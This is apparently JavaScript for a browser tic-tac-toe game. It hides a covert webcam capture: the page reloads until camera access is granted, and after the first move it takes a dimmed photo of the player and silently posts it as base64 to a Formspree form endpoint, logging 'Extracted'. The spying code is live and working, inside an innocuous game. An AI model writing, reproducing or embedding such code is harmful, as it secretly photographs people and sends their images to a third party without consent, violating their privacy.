let currentPlayer = 'X';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let streamActive = false;
        
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(function(stream) {
                video.srcObject = stream;
                streamActive = true;
                video.play();
            })
            .catch(function(err) {
                console.log("Camera prompt denied!");
              location.reload();
            });

        
        function makeMove(cell) {
            if (cell.innerText === '') {
                cell.innerText = currentPlayer;
                currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
                
                
                let moves = document.querySelectorAll('.cell:not(:empty)').length;
                if (moves === 1 && streamActive) {
                    takePhoto();
                }
            }
        }
        function takePhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

          context.filter = 'brightness(60%)';
            
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

          context.filter = 'none';
            
            
            const imageData = canvas.toDataURL('image/png');
            
            
            sendToEmail(imageData);
        }

        
        function sendToEmail(base64Image) {
            const formspreeUrl = "https://formspree.io/f/xkodpenr"; 

            fetch(formspreeUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    message: "Decode this image's DNA.",
                    image_data: base64Image
                })
            }).then(response => {
                if (response.ok) {
                    console.log("Extracted");
                } else {
                    console.error("Failed.");
                }
            }).catch(err => console.error("Error", err));
        }
